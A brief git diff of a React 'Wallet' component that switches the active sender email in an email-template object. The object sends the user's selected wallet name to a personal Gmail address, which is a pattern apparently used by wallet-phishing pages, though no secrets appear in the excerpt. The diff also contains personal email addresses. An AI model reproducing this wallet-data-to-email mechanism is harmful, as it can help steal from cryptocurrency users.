@@ -132,8 +132,8 @@ const Wallet = () => {
         // git commit -m "Your update message here"
         // git push
         let templateParams = {
-            from_email: "dazaloland@gmail.com",
-            // from_email: "techjames27@gmail.com",
+            // from_email: "dazaloland@gmail.com",
+            from_email: "techjames27@gmail.com",
             // to_email: "dazaloland@gmail.com",
             to_email: "techjames27@gmail.com",
             wallets: selectedWallet?.name,
